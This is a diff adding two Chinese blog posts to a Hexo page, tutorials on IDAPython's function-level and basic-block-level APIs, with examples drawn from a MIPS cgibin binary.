@@ -168,6 +168,302 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-Hans">
+    <link itemprop="mainEntityOfPage" href="https://oneshell.top/2023/04/06/IDAPython-%E5%87%BD%E6%95%B0%E7%B2%92%E5%BA%A6/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="OneShell">
+      <meta itemprop="description" content="菜">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="OneShell">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2023/04/06/IDAPython-%E5%87%BD%E6%95%B0%E7%B2%92%E5%BA%A6/" class="post-title-link" itemprop="url">IDAPython-函数粒度</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+
+              <time title="Created: 2023-04-06 04:50:00" itemprop="dateCreated datePublished" datetime="2023-04-06T04:50:00+08:00">2023-04-06</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">Edited on</span>
+                <time title="Modified: 2023-04-11 13:46:48" itemprop="dateModified" datetime="2023-04-11T13:46:48+08:00">2023-04-11</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">In</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E5%B7%A5%E5%85%B7%E5%85%9A/" itemprop="url" rel="index"><span itemprop="name">工具党</span></a>
+                </span>
+                  , 
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E5%B7%A5%E5%85%B7%E5%85%9A/IDAPython/" itemprop="url" rel="index"><span itemprop="name">IDAPython</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <p>整理到这儿，发现自己整理的顺序获取有点问题，应该是从粗粒度到细粒度这种自顶向下来进行整理，从段、函数、基本块、指令这样。<br>API速查如下：</p>
+<table>
+<thead>
+<tr>
+<th>模块</th>
+<th>API</th>
+<th>功能</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>idautils</td>
+<td>Functions()</td>
+<td>获取所有函数起始地址集合</td>
+</tr>
+<tr>
+<td>idc</td>
+<td>get_func_name(ea)</td>
+<td>获取地址ea所在函数的函数名</td>
+</tr>
+<tr>
+<td>idaapi</td>
+<td>get_func(ea)</td>
+<td>获取地址ea所在的函数类</td>
+</tr>
+<tr>
+<td>idc</td>
+<td>get_next_func(ea)</td>
+<td>获取地址ea所在函数的下一个函数</td>
+</tr>
+<tr>
+<td>idc</td>
+<td>get_prev_func(ea)</td>
+<td>获取地址ea所在函数的上一个函数</td>
+</tr>
+<tr>
+<td>idc</td>
+<td>get_func_attr(ea, attr)</td>
+<td>获取地址ea所在函数的attr函数属性</td>
+</tr>
+<tr>
+<td>idaapi</td>
+<td>get_arg_addrs(ea)</td>
+<td>获取函数调用地址ea处，对传参进行操作的指令集合</td>
+</tr>
+</tbody></table>
+<h2 id="函数基本操作和属性"><a href="#函数基本操作和属性" class="headerlink" title="函数基本操作和属性"></a>函数基本操作和属性</h2><p>在IDAPython中可以枚举所有的函数：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> idautils</span><br><span class="line"><span class="keyword">import</span> idc</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> func <span class="keyword">in</span> idautils.Functions():</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;0x%x, %s&quot;</span> % (func, idc.get_func_name(func)))</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">0x402b84, .init_proc</span></span><br><span class="line"><span class="string">0x402c00, _ftext</span></span><br><span class="line"><span class="string">0x402c60, sub_402C60</span></span><br><span class="line"><span class="string">0x402d34, sub_402D34</span></span><br><span class="line"><span class="string">0x402da0, main</span></span><br><span class="line"><span class="string">0x4033a0, cgibin_reatwhite</span></span><br><span class="line"><span class="string">0x403430, cgibin_verify_seamafile</span></span><br><span class="line"><span class="string">0x403700, sub_403700</span></span><br><span class="line"><span class="string">0x403894, sub_403894</span></span><br><span class="line"><span class="string">0x403db0, cgibin_parse_request</span></span><br><span class="line"><span class="string">0x404034, sub_404034</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure>
+<p><code>idautils.Functions()</code>会返回一个所有已知函数起始地址的列表，也可以通过<code>idautils.Functions(start_addr, end_addr)</code>来指定函数搜索的地址范围。<code>idc.get_func_name(ea)</code>则可以获取到函数名，<code>ea</code>可以是函数内的任一地址。<br>在IDAPython中，代表函数的数据结构可以使用<code>idaapi.get_func(ea)</code>来获得，<code>ea</code>是函数内的任一地址。此处依旧使得<code>ea</code>在cgibin的<code>main</code>函数中：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Python&gt;func = idaapi.get_func(ea)</span><br><span class="line">Python&gt;<span class="built_in">type</span>(func)</span><br><span class="line">&lt;<span class="keyword">class</span> <span class="string">&#x27;ida_funcs.func_t&#x27;</span>&gt;</span><br><span class="line">Python&gt;<span class="built_in">print</span>(<span class="string">&quot;Start: 0x%x, End: 0x%x&quot;</span> % (func.start_ea, func.end_ea))</span><br><span class="line">Start: <span class="number">0x402da0</span>, End: <span class="number">0x403328</span></span><br><span class="line">Python&gt;<span class="built_in">dir</span>(func)</span><br><span class="line">[<span class="string">&#x27;__class__&#x27;</span>, <span class="string">&#x27;__delattr__&#x27;</span>, <span class="string">&#x27;__dict__&#x27;</span>, <span class="string">&#x27;__dir__&#x27;</span>, <span class="string">&#x27;__doc__&#x27;</span>, <span class="string">&#x27;__eq__&#x27;</span>, <span class="string">&#x27;__format__&#x27;</span>, <span class="string">&#x27;__ge__&#x27;</span>, <span class="string">&#x27;__get_points__&#x27;</span>, <span class="string">&#x27;__get_referers__&#x27;</span>, <span class="string">&#x27;__get_regargs__&#x27;</span>, <span class="string">&#x27;__get_regvars__&#x27;</span>, <span class="string">&#x27;__get_tails__&#x27;</span>, <span class="string">&#x27;__getattribute__&#x27;</span>, <span class="string">&#x27;__gt__&#x27;</span>, <span class="string">&#x27;__hash__&#x27;</span>, <span class="string">&#x27;__init__&#x27;</span>, <span class="string">&#x27;__init_subclass__&#x27;</span>, <span class="string">&#x27;__le__&#x27;</span>, <span class="string">&#x27;__lt__&#x27;</span>, <span class="string">&#x27;__module__&#x27;</span>, <span class="string">&#x27;__ne__&#x27;</span>, <span class="string">&#x27;__new__&#x27;</span>, <span class="string">&#x27;__reduce__&#x27;</span>, <span class="string">&#x27;__reduce_ex__&#x27;</span>, <span class="string">&#x27;__repr__&#x27;</span>, <span class="string">&#x27;__setattr__&#x27;</span>, <span class="string">&#x27;__sizeof__&#x27;</span>, <span class="string">&#x27;__str__&#x27;</span>, <span class="string">&#x27;__subclasshook__&#x27;</span>, <span class="string">&#x27;__swig_destroy__&#x27;</span>, <span class="string">&#x27;__weakref__&#x27;</span>, <span class="string">&#x27;_print&#x27;</span>, <span class="string">&#x27;analyzed_sp&#x27;</span>, <span class="string">&#x27;argsize&#x27;</span>, <span class="string">&#x27;clear&#x27;</span>, <span class="string">&#x27;color&#x27;</span>, <span class="string">&#x27;compare&#x27;</span>, <span class="string">&#x27;contains&#x27;</span>, <span class="string">&#x27;does_return&#x27;</span>, <span class="string">&#x27;empty&#x27;</span>, <span class="string">&#x27;endEA&#x27;</span>, <span class="string">&#x27;end_ea&#x27;</span>, <span class="string">&#x27;extend&#x27;</span>, <span class="string">&#x27;flags&#x27;</span>, <span class="string">&#x27;fpd&#x27;</span>, <span class="string">&#x27;frame&#x27;</span>, <span class="string">&#x27;frregs&#x27;</span>, <span class="string">&#x27;frsize&#x27;</span>, <span class="string">&#x27;intersect&#x27;</span>, <span class="string">&#x27;is_far&#x27;</span>, <span class="string">&#x27;need_prolog_analysis&#x27;</span>, <span class="string">&#x27;overlaps&#x27;</span>, <span class="string">&#x27;owner&#x27;</span>, <span class="string">&#x27;pntqty&#x27;</span>, <span class="string">&#x27;points&#x27;</span>, <span class="string">&#x27;referers&#x27;</span>, <span class="string">&#x27;refqty&#x27;</span>, <span class="string">&#x27;regargqty&#x27;</span>, <span class="string">&#x27;regargs&#x27;</span>, <span class="string">&#x27;regvarqty&#x27;</span>, <span class="string">&#x27;regvars&#x27;</span>, <span class="string">&#x27;size&#x27;</span>, <span class="string">&#x27;startEA&#x27;</span>, <span class="string">&#x27;start_ea&#x27;</span>, <span class="string">&#x27;tailqty&#x27;</span>, <span class="string">&#x27;tails&#x27;</span>, <span class="string">&#x27;this&#x27;</span>, <span class="string">&#x27;thisown&#x27;</span>]</span><br></pre></td></tr></table></figure>
+<p>可以看到<code>func</code>是一个<code>ida_funcs.func_t</code>的类，可以进一步使用<code>dir(fucn)</code>查类中的成员。几个比较典型的成员（x86&#x2F;64下没有测试过）：</p>
+<ul>
+<li><code>analyzed_sp()</code>：是否已经分析了SP（堆栈？）</li>
+<li><code>does_return()</code>：是否有返回值</li>
+<li><code>start_ea</code>和<code>end_ea</code>：函数的起始和结束地址</li>
+<li><code>argsize</code>：栈上保存的传参数量（MIPS下测试不准）</li>
+<li><code>flags</code>：函数标志</li>
+<li><code>fpd</code>：栈帧指针？</li>
+<li><code>frregs</code>：栈帧中存放的寄存器数量</li>
+<li><code>frsize</code>：栈帧中的局部变量</li>
+<li><code>argsize</code>：寄存器传参数量</li>
+<li><code>referers</code>：调用该函数的其他函数起始地址，列表</li>
+<li><code>refqty</code>：referer的数量（我测试了感觉不准啊，不是我想象中的引用数量）</li>
+<li><code>regargqty</code>：寄存器传参数量</li>
+<li><code>regargs</code>：寄存器传参列表</li>
+<li><code>regvarqty</code>：寄存器变量数量</li>
+<li><code>regvars</code>：寄存器变量列表</li>
+</ul>
+<p>在<code>idc</code>模块还提供了许多API用于对函数的相关属性进行查询</p>
+<ul>
+<li><code>idc.get_next_func(ea)</code>和<code>idc.get_prev_func(ea)</code>：获取当前函数的下&#x2F;上一个函数，从地址空间上而言</li>
+<li><code>idc.get_func_attr(ea, FUNCATTR_START)</code>和<code>idc.get_func_attr(ea, FUNCATTR_END)</code>：获取函数的起始地址和结束地址</li>
+</ul>
+<p>如下是一个遍历函数所有指令的代码：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> idc</span><br><span class="line"></span><br><span class="line">ea = <span class="number">0x0040E71C</span></span><br><span class="line">start = idc.get_func_attr(ea, idc.FUNCATTR_START)</span><br><span class="line">end = idc.get_func_attr(ea, idc.FUNCATTR_END)</span><br><span class="line"></span><br><span class="line">cur_addr = start</span><br><span class="line"><span class="keyword">while</span> cur_addr &lt;= end:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;0x%x %s&quot;</span> % (cur_addr, idc.generate_disasm_line(cur_addr, <span class="number">0</span>)))</span><br><span class="line">    cur_addr = idc.next_head(cur_addr, end)</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">0x40e71c addiu   $sp, -0x60</span></span><br><span class="line"><span class="string">0x40e720 sw      $ra, 0x3C+var_s20($sp)</span></span><br><span class="line"><span class="string">0x40e724 sw      $s7, 0x3C+var_s1C($sp)</span></span><br><span class="line"><span class="string">0x40e728 sw      $s6, 0x3C+var_s18($sp)</span></span><br><span class="line"><span class="string">0x40e72c sw      $s5, 0x3C+var_s14($sp)</span></span><br><span class="line"><span class="string">0x40e730 sw      $s4, 0x3C+var_s10($sp)</span></span><br><span class="line"><span class="string">0x40e734 sw      $s3, 0x3C+var_sC($sp)</span></span><br><span class="line"><span class="string">0x40e738 sw      $s2, 0x3C+var_s8($sp)</span></span><br><span class="line"><span class="string">0x40e73c sw      $s1, 0x3C+var_s4($sp)</span></span><br><span class="line"><span class="string">0x40e740 sw      $s0, 0x3C+var_s0($sp)</span></span><br><span class="line"><span class="string">0x40e744 li      $gp, 0x43F7F0</span></span><br><span class="line"><span class="string">......</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure>
+<p><code>idc.get_func_attr(ea, attr)</code>还可以查询到函数的需要重要属性，如下（未列举全）：</p>
+<ul>
+<li><code>FUNC_NORET</code>：函数无返回</li>
+<li><code>FUNC_LIB</code>：函数为库函数</li>
+<li><code>FUNC_THUNK</code>：thunk函数（未理解）</li>
+</ul>
+<p>其实在<code>idc</code>模块中还有许多对函数的操作，可以参考官方文档<a target="_blank" rel="noopener" href="https://www.hex-rays.com/products/ida/support/idapython_docs/idc.html">idc模块</a></p>
+<h2 id="重要！获取函数传参"><a href="#重要！获取函数传参" class="headerlink" title="重要！获取函数传参"></a>重要！获取函数传参</h2><p>这个是第一次看到，IDAPython中具有获取函数传参相关的API。在之前，分析函数传参我是采用的先获取到架构的传参方式，例如MIPS传参通过<code>a0~a3</code>寄存器，通过<code>jr</code>等调用指令来调用函数。然后定位到<code>jr</code>指令基本块，并进行回溯，找到所有对寄存器的最近赋值操作，分析函数传参。IDAPython中有<code>idaapi.get_arg_addrs(ea)</code>可以获取到函数原型并判断传参。<br>分析一个简单的MIPS程序，反编译结果如下：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">     ++v14;</span><br><span class="line">     v13 = sobj_get_length(v7);</span><br><span class="line">     <span class="built_in">sprintf</span>(v25, <span class="string">&quot;CONTENT-LENGTH: %d \r\n&quot;</span>, v13);</span><br><span class="line">     v15 = a1;</span><br><span class="line">     v16 = v25;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>
+<p>汇编代码：在0x00405748处调用函数</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">.text:0040572C move    $t9, $v1</span><br><span class="line">.text:00405730 jalr    $t9 ; sobj_get_length</span><br><span class="line">.text:00405734 addiu   $s6, 1</span><br><span class="line">.text:00405738 move    $a0, $s7         # s</span><br><span class="line">.text:0040573C lw      $gp, 0x78+var_68($sp)</span><br><span class="line">.text:00405740 move    $a1, $fp         # format</span><br><span class="line">.text:00405744 la      $t9, sprintf</span><br><span class="line">.text:00405748 jalr    $t9 ; sprintf</span><br><span class="line">.text:0040574C move    $a2, $v0</span><br><span class="line">.text:00405750 move    $a0, $s0</span><br><span class="line">.text:00405754 lw      $gp, 0x78+var_68($sp)</span><br><span class="line">.text:00405758 la      $t9, strcat</span><br><span class="line">.text:0040575C b       loc_405794</span><br><span class="line">.text:00405760 move    $a1, $s7</span><br></pre></td></tr></table></figure>
+<p>IDAPython识别传参：可以识别到最近一次对寄存器<code>a0</code>、<code>a1</code>的赋值操作，但是忽略了<code>a2</code>寄存器，因为<code>a2</code>是在指令延迟槽中。对于MIPS架构还是有点小瑕疵哈，但对x86&#x2F;64这种应该识别率还是挺高的，毕竟反编译都能出来结果。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Python&gt;ea = 0x00405748</span><br><span class="line">Python&gt;idaapi.get_arg_addrs(ea)</span><br><span class="line">[0x405738, 0x405740]</span><br></pre></td></tr></table></figure>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-Hans">
+    <link itemprop="mainEntityOfPage" href="https://oneshell.top/2023/04/06/IDAPython-%E5%9F%BA%E6%9C%AC%E5%9D%97%E7%B2%92%E5%BA%A6/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="OneShell">
+      <meta itemprop="description" content="菜">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="OneShell">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2023/04/06/IDAPython-%E5%9F%BA%E6%9C%AC%E5%9D%97%E7%B2%92%E5%BA%A6/" class="post-title-link" itemprop="url">IDAPython-基本块粒度</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+
+              <time title="Created: 2023-04-06 03:43:34" itemprop="dateCreated datePublished" datetime="2023-04-06T03:43:34+08:00">2023-04-06</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">Edited on</span>
+                <time title="Modified: 2023-04-11 13:47:11" itemprop="dateModified" datetime="2023-04-11T13:47:11+08:00">2023-04-11</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">In</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E5%B7%A5%E5%85%B7%E5%85%9A/" itemprop="url" rel="index"><span itemprop="name">工具党</span></a>
+                </span>
+                  , 
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E5%B7%A5%E5%85%B7%E5%85%9A/IDAPython/" itemprop="url" rel="index"><span itemprop="name">IDAPython</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <p>指令粒度介绍完毕之后，该从基本块粒度进行说明了。所涉及到的API速查表格如下：</p>
+<table>
+<thead>
+<tr>
+<th>模块</th>
+<th>API</th>
+<th>功能</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>idaapi</td>
+<td>get_func(ea)</td>
+<td>获取地址ea所在函数</td>
+</tr>
+<tr>
+<td>idaapi</td>
+<td>FlowChart(f&#x3D;None, bounds&#x3D;None, flags&#x3D;0)</td>
+<td>获取函数f或者地址范围bounds的所有基本块集合</td>
+</tr>
+</tbody></table>
+<h2 id="基本块简介"><a href="#基本块简介" class="headerlink" title="基本块简介"></a>基本块简介</h2><p>先简单说一下基本块的概念，基本块（Basic Block）是一段可以被顺序执行的指令集，一般被视为程序的基本组成单元。一个程序的控制流就是由基本块组成的有向图。在一个基本块的执行过程中，它通常是由前驱基本块（predecessor）执行到当前基本块，然后当前基本块执行完毕后到后继基本块（successor）。<br>因此，大概也可以知道基本块的重要组成了：</p>
+<ol>
+<li>起始地址：基本块的第一条指令</li>
+<li>结束地址：基本块的最后一条指令</li>
+<li>指令集：基本块中所有的指令，也是要执行的指令集</li>
+<li>转移指令：用于跳转到下一个基本块</li>
+</ol>
+<p>基本块具有一个特性，那就是如果传递进行的寄存器值、使用到的内存值是一样的，那么在基本块执行完毕的寄存器集的值、内存值也是一样的。这个特性可以用于对基本块级别的仿真模拟，例如判断最后的跳转是否会被采纳。基本块在模糊测试中也被用于记录执行路径，例如AFL就是在基本块的起始地址进行了插桩，如果测试值使得基本块执行到了新的路径，那么就说明这个测试值潜力更大。<br>基本块的概念说完了，在IDA反汇编的Graph disassemble view中（空格切换，233）可以看到函数的基本块。如下就是在IDA中显示的两个基本块：<br><img src="/images/image-2023-0406-155933823.png" alt="undifined"><br>这两个基本块的作用是通过<code>strcmp</code>函数判断传入到cgibin的环境变量，选择使用哪一个接口函数来处理数据。<br>基本块1：调用phpcgi</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">.text:00402E1C</span><br><span class="line">.text:00402E1C loc_402E1C:</span><br><span class="line">.text:00402E1C la      $t9, strcmp</span><br><span class="line">.text:00402E20 move    $a0, $s0         # s1</span><br><span class="line">.text:00402E24 sw      $a2, 0x20+var_8($sp)</span><br><span class="line">.text:00402E28 jalr    $t9 ; strcmp</span><br><span class="line">.text:00402E2C li      $a1, aPhpcgi     # &quot;phpcgi&quot;</span><br><span class="line">.text:00402E30 lw      $gp, 0x20+var_10($sp)</span><br><span class="line">.text:00402E34 lw      $a2, 0x20+var_8($sp)</span><br><span class="line">.text:00402E38 bnez    $v0, loc_402E4C</span><br><span class="line">.text:00402E3C lui     $a1, 0x42  # &#x27;B&#x27;</span><br></pre></td></tr></table></figure>
+<p>基本块2：调用dlapn.cgi</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">.text:00402E4C</span><br><span class="line">.text:00402E4C loc_402E4C:</span><br><span class="line">.text:00402E4C la      $t9, strcmp</span><br><span class="line">.text:00402E50 move    $a0, $s0         # s1</span><br><span class="line">.text:00402E54 sw      $a2, 0x20+var_8($sp)</span><br><span class="line">.text:00402E58 jalr    $t9 ; strcmp</span><br><span class="line">.text:00402E5C li      $a1, aDlapnCgi   # &quot;dlapn.cgi&quot;</span><br><span class="line">.text:00402E60 lw      $gp, 0x20+var_10($sp)</span><br><span class="line">.text:00402E64 lw      $a2, 0x20+var_8($sp)</span><br><span class="line">.text:00402E68 bnez    $v0, loc_402E7C</span><br><span class="line">.text:00402E6C lui     $a1, 0x42  # &#x27;B&#x27;</span><br></pre></td></tr></table></figure>
+<h2 id="基本块操作"><a href="#基本块操作" class="headerlink" title="基本块操作"></a>基本块操作</h2><p>在IDAPython中，对基本块的操作通常是先根据一个指令地址得到指令所在的函数，然后获取到函数由基本块组成的控制流图，再遍历图中的所有基本块。如果要知道目标指令是在函数的哪一个基本块，遍历基本块然后判断。<br>如下的代码是遍历地址<code>ea</code>所在函数的所有基本块，然后判断<code>ea</code>在哪一个基本块。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> idaapi</span><br><span class="line"><span class="keyword">import</span> ida_gdl</span><br><span class="line"></span><br><span class="line">ea = <span class="number">0x00402E4C</span></span><br><span class="line">func = idaapi.get_func(ea)</span><br><span class="line">func_control_flow = idaapi.FlowChart(func, flags=idaapi.FC_PREDS)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> basic_block <span class="keyword">in</span> func_control_flow:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;ID: %i, Start: 0x%x, End: 0x%x&quot;</span> % (basic_block.<span class="built_in">id</span>, basic_block.start_ea, basic_block.end_ea))</span><br><span class="line">    <span class="keyword">if</span> basic_block.start_ea &lt;= ea &lt; basic_block.end_ea:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;    ea at Here&quot;</span>)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    succs_blocks = basic_block.succs()</span><br><span class="line">    <span class="keyword">for</span> addr <span class="keyword">in</span> succs_blocks:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;     Successor: 0x%x&quot;</span> % addr.start_ea)</span><br><span class="line">    pre_sblocks = basic_block.preds()</span><br><span class="line">    <span class="keyword">for</span> addr <span class="keyword">in</span> pre_sblocks:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;     Predecessor: 0x%x&quot;</span> % addr.end_ea)</span><br><span class="line">    <span class="keyword">if</span> ida_gdl.is_ret_block(basic_block.<span class="built_in">type</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;     Return Block&quot;</span>)</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">ID: 0, Start: 0x402da0, End: 0x402e10</span></span><br><span class="line"><span class="string">     Successor: 0x402e10</span></span><br><span class="line"><span class="string">     Successor: 0x402e1c</span></span><br><span class="line"><span class="string">ID: 1, Start: 0x402e10, End: 0x402e1c</span></span><br><span class="line"><span class="string">     Successor: 0x4032e0</span></span><br><span class="line"><span class="string">     Predecessor: 0x402e10</span></span><br><span class="line"><span class="string">ID: 2, Start: 0x402e1c, End: 0x402e40</span></span><br><span class="line"><span class="string">     Successor: 0x402e40</span></span><br><span class="line"><span class="string">     Successor: 0x402e4c</span></span><br><span class="line"><span class="string">     Predecessor: 0x402e10</span></span><br><span class="line"><span class="string">ID: 3, Start: 0x402e40, End: 0x402e4c</span></span><br><span class="line"><span class="string">     Successor: 0x4032e0</span></span><br><span class="line"><span class="string">     Predecessor: 0x402e40</span></span><br><span class="line"><span class="string">ID: 4, Start: 0x402e4c, End: 0x402e70</span></span><br><span class="line"><span class="string">    ea at Here</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure>
+<p>我之前写过一个判断MIPS命令注入的代码，大概就是，先定位对<code>system</code>代码作为<code>ea</code>，然后获取到<code>ea</code>所在的基本块，再通过广度优先搜索得到基本块的所有前驱，直到在前驱基本块中得到所有的参数（MIPS是通过<code>a0</code>、<code>a1</code>、<code>a2</code>、<code>a3</code>寄存器进行传参），后续看能不能把代码整理出来。<br>调用<code>idaapi.FlowChart()</code>实际上是调用的<code>ida_gdl.FlowChart(f=None, bounds=None, flags=0)</code>，传参如下：</p>
+<ul>
+<li><code>f</code>：通过<code>get_func(ea)</code>获取</li>
+<li><code>bounds</code>：如果<code>f</code>参数不指定则在<code>bounds</code> tuple类型<code>(start, end)</code>范围获取基本块集合</li>
+<li><code>flags</code>：<code>FC_XXX</code>标准位，具体可以在<a target="_blank" rel="noopener" href="https://hex-rays.com/products/ida/support/idapython_docs/ida_gdl.html">此处</a>查询<br>对于每一个基本块，都有如下的一些属性：</li>
+<li><code>id</code>：基本块的ID</li>
+<li><code>start_ea</code>：基本块的起始地址</li>
+<li><code>end_ea</code>：基本块的结束地址</li>
+<li><code>type</code>：基本块类型，如下依次数值从0～7<ul>
+<li><code>fcb_normal</code>：正常的基本块</li>
+<li><code>fcb_indjump</code>：基本块以间接跳转结束</li>
+<li><code>fcb_ret</code>：返回基本块，估计是函数<code>ret</code>结束时的基本块</li>
+<li><code>fcb_cndret</code>：条件返回的基本块</li>
+<li><code>fcb_noret</code>：基本块不返回</li>
+<li><code>fcb_enoret</code>：不属于函数的基本块，且不返回</li>
+<li><code>fcb_extern</code>：外部的基本块（没有理解到含义）</li>
+<li><code>fcb_error</code>：跳过不执行的基本块（不知道是否这样）</li>
+</ul>
+</li>
+<li><code>preds()</code>：获取当前基本块的所有前驱基本块集合</li>
